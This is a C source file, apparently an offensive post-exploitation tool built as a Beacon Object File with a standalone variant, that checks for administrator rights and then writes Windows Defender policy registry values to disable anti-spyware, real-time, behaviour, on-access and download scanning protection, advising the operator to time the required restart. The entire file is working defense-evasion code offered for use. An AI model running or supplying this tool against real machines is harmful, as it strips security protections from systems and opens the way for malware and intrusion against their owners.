/*
	Author: @mooolight
	
	Credits:
	- reenz0h (twitter: @SEKTOR7net)
	- cocomelonc

*/

#include "windef-disable-bof-imports.h"
#include "windef-disable-bof-structs.h"

// Check for admin rights
BOOL isUserAdmin(void) {
	BOOL isElevated = FALSE;
	HANDLE token;
	TOKEN_ELEVATION elev;
	DWORD size;
	
	if(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
		if(GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &size))
			isElevated = elev.TokenIsElevated;
	}
	
	if(token) {
		CloseHandle(token);
		token = NULL;
	}
	return isElevated;
}

#ifdef BOF

// Usage: windef-disable
void go(char *args, int alen) {
	HKEY key;
	HKEY new_key;
	DWORD disable = 1;
	
	if(!isUserAdmin()){
		PRINT( "[-] Please escalate privilege.\n");
		return;
	}
	
	LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender",0,KEY_ALL_ACCESS,&key);
	if(res == ERROR_SUCCESS) {
		RegSetValueExA(key, "DisableAntiSpyware",0,REG_DWORD, (const BYTE*) &disable, sizeof(disable));
		RegCreateKeyExA(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
		RegSetValueExA(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		RegSetValueExA(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		RegSetValueExA(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		RegSetValueExA(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		RegSetValueExA(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
	
		RegCloseKey(key);
		RegCloseKey(new_key);
	}
	
	PRINT("Perfectly disabled! Restart the machine to take effect. Find the right timing to do so...\n");
	return;
}

#else

int main(){
	HKEY key;
	HKEY new_key;
	DWORD disable = 1;
	
	if(!isUserAdmin()){
		PRINT( "[-] Please escalate privilege.\n");
		return;
	}
	
	LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender",0,KEY_ALL_ACCESS,&key);
	if(res == ERROR_SUCCESS) {
		RegSetValueExA(key, "DisableAntiSpyware",0,REG_DWORD, (const BYTE*) &disable, sizeof(disable));
		RegCreateKeyExA(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
		RegSetValueExA(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		RegSetValueExA(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		RegSetValueExA(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		RegSetValueExA(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		RegSetValueExA(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
	
		RegCloseKey(key);
		RegCloseKey(new_key);
	}
	
	PRINT("Perfectly disabled! Restart the machine to take effect. Find the right timing to do so...\n");
	return 0;
}

#endif